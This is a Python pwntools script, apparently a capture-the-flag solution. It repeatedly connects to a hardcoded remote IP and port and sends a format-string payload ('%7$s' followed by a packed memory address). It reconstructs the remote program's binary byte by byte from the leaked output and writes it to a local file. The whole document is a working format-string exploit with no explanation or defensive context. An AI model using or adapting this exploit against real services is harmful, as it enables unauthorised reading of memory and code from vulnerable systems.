#!/usr/bin/env python3
from pwn import *

try:
    binary = open('dump', 'rb').read()
except:
    binary = b''

leak = b''
crashing = 0

for i in range(99999999999999999999999999999):
    try:
        if i % 100 == 0: open('dump', 'wb').write(binary)
        io = remote("18.212.136.134", 1337)
        io.sendlineafter(b": ", b'%7$s----' + p64(0x400000 + len(binary)))
        io.recvuntil(b": ")
        leak = io.recvline().strip()
        if leak == b'': leak = io.recvline().strip() ; leak = b'\x0a' + leak
        print(leak)
        if leak.startswith(b'----'): binary += b'\x00' ; continue
        elif b'----' in leak: binary += leak[:leak.find(b'----')] ; crashing = 0
    except Exception:
        if len(binary) != 0: log.hexdump(binary)
        if crashing == 15: binary += b'\x00' ; crashing = 0 ; continue
        crashing += 1

log.hexdump(binary)